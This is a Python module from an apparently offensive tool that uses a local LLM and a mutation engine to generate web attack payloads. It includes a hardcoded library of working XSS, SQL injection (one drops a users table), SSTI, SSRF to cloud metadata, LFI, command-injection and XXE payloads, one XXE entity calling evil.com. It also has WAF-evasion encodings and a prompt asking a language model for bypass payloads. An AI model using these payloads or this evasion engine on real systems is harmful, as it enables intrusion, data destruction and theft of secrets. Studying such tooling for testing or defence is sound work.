# -*- coding: utf-8 -*-
"""
SHARINGAN - AI Payload Generator
Context-aware payload generation using local LLMs.

Supports:
- Ollama (local models)
- OpenAI-compatible APIs
- Custom mutation engine
"""

import json
import random
import re
import urllib.request
import urllib.error
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum


class VulnCategory(Enum):
    """Vulnerability categories."""
    XSS = "xss"
    SQLI = "sqli"
    SSTI = "ssti"
    SSRF = "ssrf"
    LFI = "lfi"
    RCE = "rce"
    XXE = "xxe"
    NOSQLI = "nosqli"
    CSTI = "csti"  # Client-side template injection


class WAFBypass(Enum):
    """WAF bypass techniques."""
    ENCODING = "encoding"
    CASE_VARIATION = "case_variation"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE = "whitespace"
    NULL_BYTE = "null_byte"
    HPP = "http_parameter_pollution"


@dataclass
class PayloadContext:
    """Context for payload generation."""
    vuln_type: VulnCategory
    injection_point: str  # parameter, header, body, etc.
    context: str  # html, js, sql, json, xml
    waf_detected: Optional[str] = None
    technology: Optional[str] = None
    blocked_payloads: List[str] = field(default_factory=list)
    successful_payloads: List[str] = field(default_factory=list)
    max_length: Optional[int] = None
    allowed_chars: Optional[str] = None


@dataclass
class GeneratedPayload:
    """Generated payload with metadata."""
    payload: str
    vuln_type: VulnCategory
    bypass_techniques: List[str]
    confidence: float
    description: str
    variations: List[str] = field(default_factory=list)


class PayloadMutator:
    """
    Payload mutation engine for WAF bypass.
    """

    # Encoding functions
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode payload."""
        return ''.join(f'%{ord(c):02X}' if not c.isalnum() else c for c in payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode payload."""
        return PayloadMutator.url_encode(PayloadMutator.url_encode(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode payload."""
        return ''.join(f'\\u{ord(c):04X}' for c in payload)

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML entity encode payload."""
        return ''.join(f'&#{ord(c)};' for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode payload."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

    # Case variations
    @staticmethod
    def random_case(payload: str) -> str:
        """Randomize case of payload."""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def alternate_case(payload: str) -> str:
        """Alternate case of payload."""
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))

    # Whitespace variations
    @staticmethod
    def tab_substitute(payload: str) -> str:
        """Replace spaces with tabs."""
        return payload.replace(' ', '\t')

    @staticmethod
    def newline_substitute(payload: str) -> str:
        """Replace spaces with newlines."""
        return payload.replace(' ', '\n')

    @staticmethod
    def comment_split(payload: str, comment_style: str = "html") -> str:
        """Split payload with comments."""
        comments = {
            "html": ("<!--", "-->"),
            "js": ("/*", "*/"),
            "sql": ("/*", "*/"),
        }
        start, end = comments.get(comment_style, ("/*", "*/"))
        return ''.join(f"{c}{start}{end}" if random.random() > 0.7 else c for c in payload)

    # SQL specific
    @staticmethod
    def sql_comment_bypass(payload: str) -> str:
        """Add SQL comments for bypass."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        result = payload
        for kw in keywords:
            result = re.sub(rf'\b{kw}\b', f'{kw}/**/', result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def sql_case_bypass(payload: str) -> str:
        """Randomize SQL keyword case."""
        keywords = ['select', 'union', 'from', 'where', 'and', 'or', 'insert', 'update', 'delete']
        result = payload
        for kw in keywords:
            pattern = re.compile(rf'\b{kw}\b', re.IGNORECASE)
            result = pattern.sub(PayloadMutator.random_case(kw), result)
        return result

    # XSS specific
    @staticmethod
    def xss_event_variation(payload: str) -> str:
        """Generate XSS with different events."""
        events = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onclick', 'onanimationend']
        base_match = re.search(r'on\w+', payload, re.IGNORECASE)
        if base_match:
            new_event = random.choice(events)
            return payload.replace(base_match.group(), new_event)
        return payload

    @staticmethod
    def xss_tag_variation(payload: str) -> str:
        """Generate XSS with different tags."""
        tags = ['img', 'svg', 'body', 'input', 'marquee', 'video', 'audio', 'details', 'iframe']
        base_match = re.search(r'<(\w+)', payload)
        if base_match:
            new_tag = random.choice(tags)
            return payload.replace(f'<{base_match.group(1)}', f'<{new_tag}')
        return payload

    def mutate(self, payload: str, vuln_type: VulnCategory,
               techniques: List[WAFBypass] = None) -> List[str]:
        """
        Generate mutations of a payload.

        Args:
            payload: Original payload
            vuln_type: Vulnerability type
            techniques: Bypass techniques to apply

        Returns:
            List of mutated payloads
        """
        mutations = [payload]  # Include original

        if techniques is None:
            techniques = list(WAFBypass)

        for technique in techniques:
            if technique == WAFBypass.ENCODING:
                mutations.extend([
                    self.url_encode(payload),
                    self.double_url_encode(payload),
                    self.html_entity_encode(payload),
                ])
            elif technique == WAFBypass.CASE_VARIATION:
                mutations.extend([
                    self.random_case(payload),
                    self.alternate_case(payload),
                ])
            elif technique == WAFBypass.WHITESPACE:
                mutations.extend([
                    self.tab_substitute(payload),
                    self.newline_substitute(payload),
                ])
            elif technique == WAFBypass.COMMENT_INJECTION:
                if vuln_type == VulnCategory.SQLI:
                    mutations.append(self.sql_comment_bypass(payload))
                else:
                    mutations.append(self.comment_split(payload))

        # Type-specific mutations
        if vuln_type == VulnCategory.XSS:
            mutations.extend([
                self.xss_event_variation(payload),
                self.xss_tag_variation(payload),
            ])
        elif vuln_type == VulnCategory.SQLI:
            mutations.append(self.sql_case_bypass(payload))

        # Remove duplicates while preserving order
        seen = set()
        return [x for x in mutations if not (x in seen or seen.add(x))]


class AIPayloadEngine:
    """
    AI-powered payload generator.

    Supports local LLMs via Ollama for context-aware payload generation.
    Falls back to mutation engine when AI is unavailable.
    """

    # Base payloads by vulnerability type
    BASE_PAYLOADS = {
        VulnCategory.XSS: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        VulnCategory.SQLI: [
            "' OR '1'='1",
            "1' AND '1'='1",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "1' ORDER BY 1--",
        ],
        VulnCategory.SSTI: [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
        ],
        VulnCategory.SSRF: [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",
            "http://[::1]",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211",
            "gopher://127.0.0.1:25",
        ],
        VulnCategory.LFI: [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/proc/self/environ",
        ],
        VulnCategory.RCE: [
            "; id",
            "| id",
            "` id `",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ],
        VulnCategory.XXE: [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>',
        ],
        VulnCategory.NOSQLI: [
            '{"$gt":""}',
            '{"$ne":""}',
            '{"$where":"1==1"}',
            "true, $where: '1 == 1'",
            '{"$regex":".*"}',
        ],
    }

    def __init__(self, ollama_url: str = "http://localhost:11434",
                 model: str = "llama2"):
        """
        Initialize AI Payload Engine.

        Args:
            ollama_url: Ollama API URL
            model: Model to use (e.g., "llama2", "codellama", "mistral")
        """
        self.ollama_url = ollama_url
        self.model = model
        self.mutator = PayloadMutator()
        self._ai_available = None

    def is_ai_available(self) -> bool:
        """Check if Ollama is available."""
        if self._ai_available is not None:
            return self._ai_available

        try:
            req = urllib.request.Request(f"{self.ollama_url}/api/tags")
            with urllib.request.urlopen(req, timeout=5) as response:
                self._ai_available = response.status == 200
        except Exception:
            self._ai_available = False

        return self._ai_available

    def _query_ollama(self, prompt: str) -> Optional[str]:
        """Query Ollama API."""
        try:
            data = json.dumps({
                "model": self.model,
                "prompt": prompt,
                "stream": False,
                "options": {
                    "temperature": 0.7,
                    "num_predict": 500,
                }
            }).encode('utf-8')

            req = urllib.request.Request(
                f"{self.ollama_url}/api/generate",
                data=data,
                headers={'Content-Type': 'application/json'}
            )

            with urllib.request.urlopen(req, timeout=60) as response:
                result = json.loads(response.read().decode('utf-8'))
                return result.get('response', '')

        except Exception:
            return None

    def generate(self, context: PayloadContext,
                 count: int = 10) -> List[GeneratedPayload]:
        """
        Generate payloads based on context.

        Args:
            context: Payload generation context
            count: Number of payloads to generate

        Returns:
            List of generated payloads
        """
        payloads = []

        # Try AI generation first
        if self.is_ai_available():
            ai_payloads = self._generate_ai(context)
            payloads.extend(ai_payloads)

        # Add base payloads with mutations
        base = self.BASE_PAYLOADS.get(context.vuln_type, [])
        for base_payload in base:
            # Skip if blocked before
            if base_payload in context.blocked_payloads:
                continue

            # Generate mutations
            mutations = self.mutator.mutate(base_payload, context.vuln_type)

            # Filter by constraints
            if context.max_length:
                mutations = [m for m in mutations if len(m) <= context.max_length]

            for mutation in mutations[:3]:  # Limit mutations per base
                payloads.append(GeneratedPayload(
                    payload=mutation,
                    vuln_type=context.vuln_type,
                    bypass_techniques=["mutation"],
                    confidence=0.6,
                    description=f"Mutated {context.vuln_type.value} payload",
                    variations=mutations[:5]
                ))

        # Prioritize payloads similar to successful ones
        if context.successful_payloads:
            payloads = self._prioritize_similar(payloads, context.successful_payloads)

        # Deduplicate and limit
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p.payload not in seen:
                seen.add(p.payload)
                unique_payloads.append(p)
                if len(unique_payloads) >= count:
                    break

        return unique_payloads

    def _generate_ai(self, context: PayloadContext) -> List[GeneratedPayload]:
        """Generate payloads using AI."""
        prompt = self._build_prompt(context)
        response = self._query_ollama(prompt)

        if not response:
            return []

        payloads = []
        # Parse response for payloads
        lines = response.strip().split('\n')
        for line in lines:
            # Look for payload patterns
            line = line.strip()
            if line and not line.startswith('#') and len(line) > 3:
                # Clean up common prefixes
                for prefix in ['- ', '* ', '1. ', '2. ', '3. ', '`', '"', "'"]:
                    if line.startswith(prefix):
                        line = line[len(prefix):]
                for suffix in ['`', '"', "'"]:
                    if line.endswith(suffix):
                        line = line[:-len(suffix)]

                if line:
                    payloads.append(GeneratedPayload(
                        payload=line,
                        vuln_type=context.vuln_type,
                        bypass_techniques=["ai_generated"],
                        confidence=0.8,
                        description="AI-generated payload"
                    ))

        return payloads[:10]

    def _build_prompt(self, context: PayloadContext) -> str:
        """Build prompt for AI model."""
        waf_info = f"WAF detected: {context.waf_detected}. " if context.waf_detected else ""
        tech_info = f"Technology: {context.technology}. " if context.technology else ""
        blocked_info = ""
        if context.blocked_payloads:
            blocked_info = f"Previously blocked payloads: {', '.join(context.blocked_payloads[:3])}. "

        prompt = f"""You are a web security expert. Generate {context.vuln_type.value.upper()} payloads for security testing.

Context:
- Injection point: {context.injection_point}
- Context type: {context.context}
{waf_info}{tech_info}{blocked_info}

Generate 5 unique payloads that:
1. Are likely to bypass WAF if present
2. Fit the injection context
3. Are different from blocked payloads

Output only the payloads, one per line, no explanations:"""

        return prompt

    def _prioritize_similar(self, payloads: List[GeneratedPayload],
                           successful: List[str]) -> List[GeneratedPayload]:
        """Prioritize payloads similar to successful ones."""
        def similarity_score(payload: str, successful: List[str]) -> float:
            scores = []
            for s in successful:
                # Simple character overlap score
                common = set(payload.lower()) & set(s.lower())
                score = len(common) / max(len(set(payload)), 1)
                scores.append(score)
            return max(scores) if scores else 0

        return sorted(
            payloads,
            key=lambda p: similarity_score(p.payload, successful),
            reverse=True
        )

    def suggest_bypass(self, blocked_payload: str,
                       context: PayloadContext) -> List[GeneratedPayload]:
        """
        Suggest bypass for a blocked payload.

        Args:
            blocked_payload: Payload that was blocked
            context: Current context

        Returns:
            List of bypass suggestions
        """
        context.blocked_payloads.append(blocked_payload)

        # Generate mutations with all bypass techniques
        mutations = self.mutator.mutate(
            blocked_payload,
            context.vuln_type,
            list(WAFBypass)
        )

        payloads = []
        for mutation in mutations:
            if mutation != blocked_payload:
                payloads.append(GeneratedPayload(
                    payload=mutation,
                    vuln_type=context.vuln_type,
                    bypass_techniques=[t.value for t in WAFBypass],
                    confidence=0.5,
                    description=f"WAF bypass variation of blocked payload"
                ))

        return payloads[:20]

    def learn_from_success(self, payload: str, context: PayloadContext):
        """
        Record successful payload for learning.

        Args:
            payload: Successful payload
            context: Context where it worked
        """
        context.successful_payloads.append(payload)
        # In a real implementation, this would update a local database
        # or fine-tune the model

    def get_summary(self) -> Dict[str, Any]:
        """Get engine summary."""
        return {
            "ai_available": self.is_ai_available(),
            "model": self.model,
            "supported_vulns": [v.value for v in VulnCategory],
            "bypass_techniques": [t.value for t in WAFBypass],
        }
